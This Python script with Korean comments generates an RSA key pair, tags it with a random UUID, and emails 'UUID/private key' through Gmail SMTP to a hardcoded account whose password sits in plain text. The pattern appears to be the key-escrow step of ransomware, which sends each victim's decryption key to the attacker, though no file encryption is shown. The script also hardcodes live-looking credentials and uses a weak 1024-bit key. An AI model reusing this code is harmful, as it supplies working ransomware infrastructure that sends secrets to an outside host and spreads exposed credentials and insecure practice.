from Crypto.PublicKey import RSA
from Crypto import Random  #RSA 키 생성시 필요
from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
#라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
import smtplib
import uuid
from email.mime.text import MIMEText

if __name__ == "__main__":

    # RSA : 키, 싸이퍼 생성
    random_generator = Random.new().read
    rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
    cipher = PKCS1_OAEP.new(rsa_key)
    private_key = rsa_key.export_key()
    print("비밀키는 : ", private_key)

    # 고유 식별자 번호
    UUID = uuid.uuid4()

    # smtp 로그인 후 비밀키 전송
    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.ehlo()  # say Hello
    smtp.starttls()  # TLS 사용시 필요
    smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!

    msg = MIMEText(str(UUID) + '/' + private_key.decode())  # 고유식별자번호 / RSA개인키 를 메세지로 전송함
    msg['Subject'] = '테스트'
    msg['To'] = 'secureantdd@gmail.com'
    smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())

    smtp.quit()
